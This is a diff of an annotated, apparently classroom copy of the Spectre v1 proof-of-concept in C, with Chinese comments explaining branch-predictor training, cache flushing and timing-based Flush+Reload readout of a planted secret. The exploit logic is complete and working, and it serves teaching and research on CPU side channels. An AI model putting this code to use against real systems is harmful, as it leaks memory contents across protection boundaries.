@@ -3,7 +3,12 @@
 #include <string.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
+/*SIMD拓展指令集的内置函数 intrinsic functions*/
+
 #pragma optimize("gt", on)
+/*开启全局优化技术，能够实现跨函数边界的优化*/
+/*最小、最快整数 表示至少具有指定位数的数*/
+
 #else
 #include <x86intrin.h> /* for rdtscp and clflush */
 #endif
@@ -12,30 +17,32 @@
 #ifndef _MSC_VER
 #define sscanf_s sscanf
 #endif
+/*sscanf函数，根据字符串str中的数据类型赋值给相应数据*/
 
 /********************************************************************
 受害者代码
 ********************************************************************/
 unsigned int array1_size = 16;
 
-//在array1前后各定义64字节未使用内存空间
-uint8_t unused1[64];
+uint8_t unused1[64];//在array1前后各定义64字节未使用内存空间
 
 //uint8_t 定义array1的每个元素1字节，memory中一个地址空间存储 1 byte，即8 bits数据，对应一个ASCII值
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 
-uint8_t unused2[64];
+uint8_t unused2[64];//在array1前后各定义64字节未使用内存空间
 
-//cache line = 64 bytes = 512 bits
-//256个cache line
-uint8_t flush_reload_buffer[256 * 512];
+//ubuntu下可以使用getconf -a 命令查看详细的cache line size 64B
+//cache line = 64 Bytes = 512 bits
+
+uint8_t flush_reload_buffer[256 * 512];//256个cache line
 
 //秘密信息：target
-char* secret = "the secret is Peking university,let's try to read the secret";
+char* secret = "NingXiaUniversity12022131904";
 
 //将temp变量定义在函数外面,使编译器不会优化victom_function()
 uint8_t temp = 0;
 
+//受害者函数
 void victim_function(size_t x)
 {
 	if (x < array1_size)
@@ -74,19 +81,21 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 
 	for (tries = 999; tries > 0; tries--)
 	{
-		//uint8_t array2[256 * 512];clflush m8：清除包含地址m8的cache line。
+		//将256个cache line中的数据都清空
 		for (i = 0; i < 256; i++)
 			_mm_clflush(&flush_reload_buffer[i * 512]);
-		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。array1_size=16
+
+		//30次循环：每训练5次(x=training_x)，攻击1次(x=malicious_x)。
+		//array1_size=16
 		training_x = tries % array1_size;
 		for (j = 29; j >= 0; j--)
 		{ 
-			//从cache中驱逐array1_size
-			_mm_clflush(&array1_size);
-			//延迟，也可以使用mfence，这一部分是必须的，删除后会攻击失败。
-
-			//mfence:保证内存访问(读/)的串行化，内部操作就是在一系列内存访问中添加若干延迟，
-			//保证此指令之后的内存访问发生在此指令之前的内存访问完成之后（不出现重叠）
+			_mm_clflush(&array1_size);//将array_size从cache中擦除
+			/*
+			延迟，也可以使用mfence，这一部分是必须的，删除后会攻击失败。
+			mfence:保证内存访问(读/)的串行化，内部操作就是在一系列内存访问中添加若干延迟
+			保证此指令之后的内存访问发生在此指令之前的内存访问完成之后（不出现重叠）
+			*/
 			for (volatile int z = 0; z < 100; z++)
 			{
 				/* Delay (can also mfence) */
@@ -97,10 +106,10 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 			//j x x x对应输出：29 0 0 training_x,28 0 0 training_x,...,24 -65536 -1 malicious_x,...
 
 			//这部分逻辑就是控制5次training_x，1次malicious_x
-			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
+			x = ((j % 6) - 1) & ~0xFFFF; 
 			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
 			x = training_x ^ (x & (malicious_x ^ training_x));
-			/* Call the victim! */
+			/*调用受害者函数*/
 			victim_function(x);
 		}
 
@@ -108,21 +117,27 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 		/* Time reads. Order is lightly mixed up to prevent stride prediction */
 		for (i = 0; i < 256; i++)
 		{
-			//mix_i随机取遍0~255，为了防止stride prediction，对顺序轻微混淆
-			mix_i = ((i * 167) + 13) & 255;
+			/* 
+			乘以 167 是为了打乱 i 的顺序，使得生成的随机数更加均匀分布。
+			如果直接用 i 来取模，那么生成的随机数就会按照 i 的增长而循环，没有随机性。
+			167 是一个素数，它和 256 互质，所以乘以 167 后取模 256，
+			可以得到 0 ~ 255 中的所有可能值。
+			当然，也可以用其他的素数来代替 167，只要它们和 256 互质即可。
+			*/
+			mix_i = ((i * 167) + 13) & 255;//255与，只留低8bit
+
 			addr = &flush_reload_buffer[mix_i * 512];
 
 			//开始计时
 			time1 = __rdtscp(&junk); /* READ TIMER */
-			//访问flush_reload_buffer[mix_i * 512]
-			junk = *addr; /* MEMORY ACCESS TO TIME */
+			
+			junk = *addr;
 
-			//结束计时&计算访问时间
 			time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 
 			//若访问时间小于cache hit阈值，array1[malicious_x]=mix_i的分数+1
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
-				results[mix_i]++; /* cache hit - add +1 to score for this value */
+				++results[mix_i]; /* cache hit - add +1 to score for this value */
 		}
 
 		//最优/次优结果：j/k
@@ -156,14 +171,7 @@ void readMemoryByte( unsigned long malicious_x, unsigned char value[2], int scor
 int main(int argc, const char** argv)
 {
 	printf("main process:\n");
-	printf("将秘密值 【%s】 放置在内存中，其秘密值存放地址:【%p】\n", secret, (void *)(secret));
-	//初始化malicious_x，其初值为secret与array1的地址差值
-	//secret：0x55fbca790f28，array1：0x55fbca992040
-	//malicious_x=0x55fbca790f28-0x55fbca992040 = -2101544
-	//此外flush_reload_buffer地址：0x558df22cc580，
-	//unused1：0x560c3d0ba540
-	//unused2：0x556f96926580
-	
+	printf("将secret数组 【%s】 放置在内存中，其存放地址:【%p】\n", secret, (void *)(secret));
 	//获取偏移量，也就是预测执行将要读取的地方
 	size_t malicious_x = (size_t)(secret - (char *)array1); 
 
@@ -187,25 +195,16 @@ int main(int argc, const char** argv)
 	printf("共读取 %d 字节:\n", len);
 	while (--len >= 0)
 	{
-		//最初malicious_x=-2101544，转2进制10 0000 0001 0001 0010 1000
-		//取补码：1101 1111 1110 1110 1101 1000，即0xffffffffffdfeed8
-
 		printf("读取恶意偏移量(-malicious_x-) 【%p】 ", (void *)malicious_x);
 		//依次对所有字节发起攻击
 		readMemoryByte(malicious_x++, value, score);
 
-		printf("%s: ", (score[0] >= 2 * score[1] ? "成功" : "不明"));
-
-		//输出value[0]的值，value[0]为字符对应的ASCII码，字符有效则输出，无效则'?'。
-		printf("0x%02X='%c' score=%d ", value[0], 
-										(value[0] > 31 && value[0] < 127 ? value[0] : '?'),
-										score[0] );
+		printf("%s: ", (score[0] >=  score[1] ? "成功" : "不明"));
+		//printf("%s: ", (score[0] >=  2* score[1] ? "成功" : "不明"));
+		printf("0x%02X='%c' score=%d ", value[0], value[0], score[0] );
 
 		if (score[1] > 0)
-			printf("(2nd best: 0x%02X='%c' score=%d)\n",
-				value[1],
-				(value[1] > 31 && value[1] < 127 ? value[1] : '?'),
-				score[1]);
+			printf("(second: 0x%02X='%c' second_score=%d)\n",value[1],value[1],score[1]);
 	}
 
 #ifdef _MSC_VER
